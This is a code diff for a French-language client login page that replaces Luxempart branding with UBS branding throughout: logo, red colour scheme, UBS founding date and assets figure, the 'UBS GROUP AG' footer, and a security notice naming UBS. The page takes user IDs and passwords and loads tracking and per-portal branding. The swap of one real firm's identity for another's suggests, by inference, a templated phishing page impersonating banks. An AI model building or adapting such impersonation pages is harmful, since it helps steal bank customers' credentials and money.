@@ -6,7 +6,7 @@ import { Loader2, Eye, EyeOff, AlertCircle, Lock, Mail, Shield, ShieldCheck, Lan
 import { toast } from 'sonner';
 import { track, startTracking, flushNow } from '@/lib/clientTracking';
 import { fetchPortalBranding, getCachedPortalBranding, type PortalBranding } from '@/lib/portalBranding';
-import luxempartLogoWhite from '@/assets/luxempart-logo-white.svg';
+import ubsLogoWhite from '@/assets/ubs-logo-white.svg';
 
 const normalizeClientEmail = (value: string) => value.trim().toLowerCase();
 
@@ -30,10 +30,10 @@ const friendlyMessage = (err: CrmSignInError): string => {
 
 /* ── Banking services ── */
 const services = [
-  { icon: Landmark,       title: 'Gestion de patrimoine',   desc: 'Stratégies personnalisées selon vos objectifs à long terme.' },
-  { icon: FileText,       title: 'Placements & Épargne',    desc: 'Comptes à terme, produits structurés et solutions d\'épargne.' },
-  { icon: UserCheck,      title: 'Conseil dédié',           desc: 'Un conseiller personnel à votre écoute pour chaque décision.' },
-  { icon: HeadphonesIcon, title: 'Service 24h/24',          desc: 'Accès à votre espace et assistance disponibles à tout moment.' },
+  { icon: Landmark,       title: 'Wealth Management',    desc: 'Stratégies personnalisées de gestion de fortune pour une clientèle privée internationale.' },
+  { icon: FileText,       title: 'Asset Management',     desc: 'Gestion d\'actifs institutionnels, produits structurés et solutions d\'investissement.' },
+  { icon: UserCheck,      title: 'Conseil dédié',         desc: 'Un conseiller personnel UBS à votre écoute pour chaque décision patrimoniale.' },
+  { icon: HeadphonesIcon, title: 'Service 24h/24',        desc: 'Accès à votre espace client et assistance disponibles à tout moment.' },
 ];
 
 const ClientLogin = () => {
@@ -119,7 +119,7 @@ const ClientLogin = () => {
 
   if (brandingLoading && !branding) {
     return (
-      <div className="min-h-screen flex items-center justify-center" style={{ background: '#081A3A' }}>
+      <div className="min-h-screen flex items-center justify-center" style={{ background: '#111111' }}>
         <Loader2 className="w-6 h-6 animate-spin text-white/30" />
       </div>
     );
@@ -140,8 +140,8 @@ const ClientLogin = () => {
       {/* ── CSS animations ── */}
       <style>{`
         @keyframes gridPulse {
-          0%, 100% { opacity: 0.025; }
-          50%       { opacity: 0.045; }
+          0%, 100% { opacity: 0.018; }
+          50%       { opacity: 0.035; }
         }
         @keyframes fadeUp {
           from { opacity: 0; transform: translateY(12px); }
@@ -157,12 +157,12 @@ const ClientLogin = () => {
         .anim-fadeup-4 { animation: fadeUp 0.55s ease-out 0.55s both; }
         .anim-fadeup-5 { animation: fadeUp 0.55s ease-out 0.7s both; }
         .login-input:focus {
-          border-color: #123A70 !important;
-          box-shadow: 0 0 0 3px rgba(18,58,112,0.10) !important;
+          border-color: #E60000 !important;
+          box-shadow: 0 0 0 3px rgba(230,0,0,0.10) !important;
           background: #fff !important;
         }
         .login-btn:not(:disabled):hover {
-          box-shadow: 0 8px 32px rgba(8,26,58,0.55) !important;
+          box-shadow: 0 8px 32px rgba(230,0,0,0.45) !important;
           transform: translateY(-1px);
         }
         .login-btn:not(:disabled):active {
@@ -170,7 +170,7 @@ const ClientLogin = () => {
         }
       `}</style>
 
-      <div className="min-h-screen flex flex-col" style={{ background: '#F0F4FA' }}>
+      <div className="min-h-screen flex flex-col" style={{ background: '#F5F5F5' }}>
 
         {/* ═══════════════════════════════════════════
             LEFT PANEL
@@ -178,7 +178,7 @@ const ClientLogin = () => {
         <div className="flex flex-1">
         <div
           className="hidden lg:flex lg:w-[52%] flex-col relative overflow-hidden"
-          style={{ background: 'linear-gradient(150deg, #04090f 0%, #081A3A 50%, #0e2550 80%, #123A70 100%)' }}
+          style={{ background: 'linear-gradient(150deg, #080808 0%, #111111 50%, #1A1A1A 80%, #222222 100%)' }}
         >
           {/* Animated grid */}
           <div className="absolute inset-0 pointer-events-none" style={{
@@ -190,38 +190,38 @@ const ClientLogin = () => {
 
           {/* Radial glows */}
           <div className="absolute inset-0 pointer-events-none" style={{
-            backgroundImage: `radial-gradient(ellipse at 15% 20%, rgba(212,175,55,0.10) 0%, transparent 45%),
-                              radial-gradient(ellipse at 85% 75%, rgba(18,58,112,0.5) 0%, transparent 50%)`
+            backgroundImage: `radial-gradient(ellipse at 15% 20%, rgba(230,0,0,0.12) 0%, transparent 45%),
+                              radial-gradient(ellipse at 85% 75%, rgba(230,0,0,0.07) 0%, transparent 50%)`
           }} />
 
           {/* Content */}
           <div className="relative z-10 flex flex-col h-full px-12 xl:px-16 pt-12 pb-8">
 
-            {/* Logo — bigger */}
+            {/* Logo */}
             <div className="anim-fadeup-1 mb-10">
-              <img src={luxempartLogoWhite} alt="Luxempart" className="h-16 w-auto"
-                style={{ filter: 'brightness(1.15) drop-shadow(0 2px 10px rgba(0,0,0,0.5))' }} />
+              <img src={ubsLogoWhite} alt="UBS" className="h-14 w-auto"
+                style={{ filter: 'brightness(1.1) drop-shadow(0 2px 10px rgba(0,0,0,0.6))' }} />
             </div>
 
-            {/* Gold line + headline */}
+            {/* Red line + headline */}
             <div className="anim-fadeup-2 mb-6">
-              <div style={{ width: '64px', height: '3px', background: 'linear-gradient(90deg, #D4AF37, #f5da82)', borderRadius: '2px', marginBottom: '22px' }} />
+              <div style={{ width: '64px', height: '3px', background: 'linear-gradient(90deg, #E60000, #FF4444)', borderRadius: '2px', marginBottom: '22px' }} />
               <h1 style={{ fontSize: '2.2rem', fontWeight: 200, lineHeight: 1.22, letterSpacing: '-0.01em', color: '#fff', marginBottom: '14px' }}>
                 L'excellence au service<br />
-                <span style={{ fontWeight: 700, color: '#D4AF37' }}>de votre patrimoine.</span>
+                <span style={{ fontWeight: 700, color: '#E60000' }}>de votre patrimoine.</span>
               </h1>
-              <p style={{ fontSize: '0.88rem', fontWeight: 300, color: 'rgba(255,255,255,0.48)', lineHeight: 1.65, maxWidth: '340px' }}>
-                Plateforme institutionnelle de gestion de patrimoine, réservée à notre clientèle privée. Confidentialité, performance et sécurité maximales.
+              <p style={{ fontSize: '0.88rem', fontWeight: 300, color: 'rgba(255,255,255,0.45)', lineHeight: 1.65, maxWidth: '340px' }}>
+                Plateforme institutionnelle UBS de gestion de fortune, réservée à notre clientèle privée. Confidentialité, performance et sécurité maximales.
               </p>
             </div>
 
             {/* Key stats */}
             <div className="anim-fadeup-3 grid grid-cols-2 gap-3 mb-7">
               {[
-                { value: '1988', label: 'Fondée en' },
-                { value: '€1,8 Mrd', label: 'Actifs gérés' },
+                { value: '1862', label: 'Fondée en' },
+                { value: 'CHF 5,7 Trn', label: 'Actifs gérés' },
               ].map(stat => (
-                <div key={stat.label} style={{ borderTop: '1px solid rgba(212,175,55,0.30)', paddingTop: '12px' }}>
+                <div key={stat.label} style={{ borderTop: '1px solid rgba(230,0,0,0.30)', paddingTop: '12px' }}>
                   <div style={{ fontSize: '1.3rem', fontWeight: 600, color: '#fff', letterSpacing: '-0.02em', marginBottom: '4px' }}>{stat.value}</div>
                   <div style={{ fontSize: '0.63rem', textTransform: 'uppercase', letterSpacing: '0.09em', color: 'rgba(255,255,255,0.30)' }}>{stat.label}</div>
                 </div>
@@ -230,7 +230,7 @@ const ClientLogin = () => {
 
             {/* Banking services grid */}
             <div className="anim-fadeup-4 mb-auto">
-              <div style={{ width: '100%', height: '1px', background: 'linear-gradient(90deg, transparent, rgba(212,175,55,0.20), transparent)', marginBottom: '20px' }} />
+              <div style={{ width: '100%', height: '1px', background: 'linear-gradient(90deg, transparent, rgba(230,0,0,0.25), transparent)', marginBottom: '20px' }} />
               <div className="grid grid-cols-2 gap-4">
                 {services.map(({ icon: Icon, title, desc }) => (
                   <div key={title}
@@ -238,8 +238,8 @@ const ClientLogin = () => {
                     style={{ background: 'rgba(255,255,255,0.04)', border: '1px solid rgba(255,255,255,0.07)' }}
                   >
                     <div className="flex items-center justify-center rounded-lg mb-3"
-                      style={{ width: '36px', height: '36px', background: 'rgba(212,175,55,0.12)', border: '1px solid rgba(212,175,55,0.20)' }}>
-                      <Icon size={16} style={{ color: '#D4AF37' }} />
+                      style={{ width: '36px', height: '36px', background: 'rgba(230,0,0,0.12)', border: '1px solid rgba(230,0,0,0.22)' }}>
+                      <Icon size={16} style={{ color: '#E60000' }} />
                     </div>
                     <div style={{ fontSize: '0.78rem', fontWeight: 600, color: 'rgba(255,255,255,0.80)', marginBottom: '5px' }}>{title}</div>
                     <div style={{ fontSize: '0.68rem', color: 'rgba(255,255,255,0.35)', lineHeight: 1.55, fontWeight: 300 }}>{desc}</div>
@@ -251,19 +251,19 @@ const ClientLogin = () => {
 
           {/* Institutional footer */}
           <div className="relative z-10 px-12 xl:px-16 py-5"
-            style={{ borderTop: '1px solid rgba(255,255,255,0.07)', background: 'rgba(0,0,0,0.15)' }}>
+            style={{ borderTop: '1px solid rgba(255,255,255,0.06)', background: 'rgba(0,0,0,0.25)' }}>
             <div className="flex items-end justify-between">
               <div>
                 <div style={{ fontSize: '0.72rem', fontWeight: 600, color: 'rgba(255,255,255,0.55)', letterSpacing: '0.05em' }}>
-                  LUXEMPART S.A.
+                  UBS GROUP AG
                 </div>
                 <div style={{ fontSize: '0.65rem', color: 'rgba(255,255,255,0.28)', marginTop: '2px' }}>
-                  Société de gestion de patrimoine — Luxembourg
+                  Banque privée internationale — Suisse
                 </div>
               </div>
               <div style={{ textAlign: 'right' }}>
                 <div style={{ fontSize: '0.65rem', color: 'rgba(255,255,255,0.22)', letterSpacing: '0.04em' }}>
-                  Depuis 1988
+                  Depuis 1862
                 </div>
                 <div style={{ fontSize: '0.6rem', color: 'rgba(255,255,255,0.16)', marginTop: '2px' }}>
                   © 2026 Tous droits réservés
@@ -277,15 +277,15 @@ const ClientLogin = () => {
             RIGHT PANEL — Login form
         ═══════════════════════════════════════════ */}
         <div className="flex-1 flex flex-col items-center justify-start relative px-6 py-10 overflow-y-auto"
-          style={{ background: 'linear-gradient(160deg, #edf1f7 0%, #F0F4FA 60%, #e8edf6 100%)', minWidth: 0 }}>
+          style={{ background: 'linear-gradient(160deg, #f2f2f2 0%, #F5F5F5 60%, #ebebeb 100%)', minWidth: 0 }}>
 
-          {/* Mobile navy bg */}
+          {/* Mobile dark bg */}
           <div className="absolute inset-0 lg:hidden"
-            style={{ background: 'linear-gradient(150deg, #04090f 0%, #081A3A 60%, #123A70 100%)' }} />
+            style={{ background: 'linear-gradient(150deg, #080808 0%, #111111 60%, #1A1A1A 100%)' }} />
 
           {/* Mobile logo */}
           <div className="lg:hidden relative z-10 mb-8">
-            <img src={luxempartLogoWhite} alt="Luxempart" className="h-12 w-auto mx-auto" />
+            <img src={ubsLogoWhite} alt="UBS" className="h-12 w-auto mx-auto" />
           </div>
 
           {/* Card */}
@@ -296,13 +296,13 @@ const ClientLogin = () => {
                 background: 'rgba(255,255,255,0.97)',
                 backdropFilter: 'blur(20px)',
                 WebkitBackdropFilter: 'blur(20px)',
-                boxShadow: '0 24px 64px rgba(8,26,58,0.18), 0 4px 16px rgba(8,26,58,0.08)',
-                border: '1px solid rgba(212,175,55,0.2)',
+                boxShadow: '0 24px 64px rgba(0,0,0,0.14), 0 4px 16px rgba(0,0,0,0.07)',
+                border: '1px solid rgba(230,0,0,0.15)',
               }}
             >
               {/* ── Heading ── */}
               <div className="mb-5">
-                <h2 style={{ fontSize: '1.6rem', fontWeight: 700, color: '#0d1b2e', marginBottom: '6px', lineHeight: 1.2 }}>
+                <h2 style={{ fontSize: '1.6rem', fontWeight: 700, color: '#111111', marginBottom: '6px', lineHeight: 1.2 }}>
                   Bienvenue dans votre espace<br />client sécurisé
                 </h2>
                 <p style={{ fontSize: '0.82rem', color: '#64748b', lineHeight: 1.6 }}>
@@ -328,7 +328,7 @@ const ClientLogin = () => {
                       placeholder="Entrez votre identifiant"
                       autoComplete="email"
                       className="login-input w-full text-sm outline-none transition-all text-slate-800 placeholder-slate-300"
-                      style={{ height: '50px', paddingLeft: '44px', paddingRight: '16px', border: '1.5px solid #e2e8f0', borderRadius: '12px', background: '#f8fafd' }}
+                      style={{ height: '50px', paddingLeft: '44px', paddingRight: '16px', border: '1.5px solid #e2e8f0', borderRadius: '12px', background: '#f8f8f8' }}
                     />
                   </div>
                 </div>
@@ -339,7 +339,7 @@ const ClientLogin = () => {
                     <label style={{ display: 'block', fontSize: '0.7rem', fontWeight: 700, textTransform: 'uppercase', letterSpacing: '0.07em', color: '#64748b' }}>
                       Mot de passe
                     </label>
-                    <a href="#" style={{ fontSize: '0.72rem', color: '#081A3A', textDecoration: 'none', opacity: 0.6 }}
+                    <a href="#" style={{ fontSize: '0.72rem', color: '#E60000', textDecoration: 'none', opacity: 0.75 }}
                       className="hover:opacity-100 transition-opacity">
                       Mot de passe oublié ?
                     </a>
@@ -353,7 +353,7 @@ const ClientLogin = () => {
                       placeholder="Entrez votre mot de passe"
                       autoComplete="current-password"
                       className="login-input w-full text-sm outline-none transition-all text-slate-800 placeholder-slate-300"
-                      style={{ height: '50px', paddingLeft: '44px', paddingRight: '48px', border: '1.5px solid #e2e8f0', borderRadius: '12px', background: '#f8fafd' }}
+                      style={{ height: '50px', paddingLeft: '44px', paddingRight: '48px', border: '1.5px solid #e2e8f0', borderRadius: '12px', background: '#f8f8f8' }}
                     />
                     <button type="button" onClick={() => setShowPassword(v => !v)} tabIndex={-1}
                       style={{ position: 'absolute', right: '14px', top: '50%', transform: 'translateY(-50%)', padding: '4px', color: '#94a3b8', background: 'none', border: 'none', cursor: 'pointer' }}
@@ -366,7 +366,7 @@ const ClientLogin = () => {
                 {/* Remember device */}
                 <label className="flex items-center gap-2.5 cursor-pointer">
                   <input type="checkbox" checked={rememberMe} onChange={e => setRememberMe(e.target.checked)}
-                    className="w-4 h-4 rounded cursor-pointer" style={{ accentColor: '#081A3A' }} />
+                    className="w-4 h-4 rounded cursor-pointer" style={{ accentColor: '#E60000' }} />
                   <span style={{ fontSize: '0.82rem', color: '#64748b' }}>Se souvenir de cet appareil pendant 30 jours</span>
                 </label>
 
@@ -387,8 +387,8 @@ const ClientLogin = () => {
                     flex items-center justify-center gap-2"
                   style={{
                     height: '54px',
-                    background: 'linear-gradient(135deg, #061525 0%, #081A3A 40%, #123A70 100%)',
-                    boxShadow: '0 6px 24px rgba(8,26,58,0.42)',
+                    background: 'linear-gradient(135deg, #C00000 0%, #E60000 50%, #FF1A1A 100%)',
+                    boxShadow: '0 6px 24px rgba(230,0,0,0.38)',
                     border: 'none',
                     fontSize: '0.9rem',
                     letterSpacing: '0.02em',
@@ -402,7 +402,7 @@ const ClientLogin = () => {
 
                 {/* Help link */}
                 <p className="text-center" style={{ fontSize: '0.75rem', color: '#94a3b8' }}>
-                  <a href="#" style={{ color: '#081A3A', textDecoration: 'none', opacity: 0.55 }}
+                  <a href="#" style={{ color: '#111111', textDecoration: 'none', opacity: 0.5 }}
                     className="hover:opacity-90 transition-opacity">
                     Besoin d'aide pour vous connecter ?
                   </a>
@@ -421,8 +421,8 @@ const ClientLogin = () => {
                     { icon: Activity,   label: 'Surveillance 24h/24' },
                   ].map(({ icon: Icon, label }) => (
                     <div key={label} className="flex flex-col items-center gap-1.5 rounded-xl py-3 px-2"
-                      style={{ background: '#f8fafd', border: '1px solid #edf2f7' }}>
-                      <Icon size={16} style={{ color: '#081A3A', opacity: 0.7 }} />
+                      style={{ background: '#f8f8f8', border: '1px solid #eeeeee' }}>
+                      <Icon size={16} style={{ color: '#E60000', opacity: 0.85 }} />
                       <span style={{ fontSize: '0.6rem', color: '#64748b', fontWeight: 500, textAlign: 'center', lineHeight: 1.3 }}>{label}</span>
                     </div>
                   ))}
@@ -430,10 +430,10 @@ const ClientLogin = () => {
               </div>
 
               {/* ── Security advice ── */}
-              <div className="mt-4 rounded-xl p-4" style={{ background: 'rgba(201,168,76,0.07)', border: '1px solid rgba(201,168,76,0.25)' }}>
-                <p style={{ fontSize: '0.72rem', color: '#5a4a1c', lineHeight: 1.6 }}>
+              <div className="mt-4 rounded-xl p-4" style={{ background: 'rgba(230,0,0,0.04)', border: '1px solid rgba(230,0,0,0.15)' }}>
+                <p style={{ fontSize: '0.72rem', color: '#4a1010', lineHeight: 1.6 }}>
                   <span style={{ fontWeight: 700 }}>Conseil sécurité :</span>{' '}
-                  Ne communiquez jamais vos identifiants ou votre code confidentiel. Luxempart ne vous demandera jamais ces informations par téléphone ou par e-mail.
+                  Ne communiquez jamais vos identifiants ou votre code confidentiel. UBS ne vous demandera jamais ces informations par téléphone ou par e-mail.
                 </p>
               </div>
 
@@ -448,8 +448,8 @@ const ClientLogin = () => {
                   ].map(({ icon: Icon, text, sub }) => (
                     <div key={text} className="flex items-center gap-3">
                       <div className="flex-shrink-0 w-7 h-7 rounded-lg flex items-center justify-center"
-                        style={{ background: 'rgba(8,26,58,0.06)' }}>
-                        <Icon size={13} style={{ color: '#081A3A', opacity: 0.7 }} />
+                        style={{ background: 'rgba(230,0,0,0.07)' }}>
+                        <Icon size={13} style={{ color: '#E60000', opacity: 0.8 }} />
                       </div>
                       <div>
                         <p style={{ fontSize: '0.72rem', fontWeight: 600, color: '#1e293b', lineHeight: 1.2 }}>{text}</p>
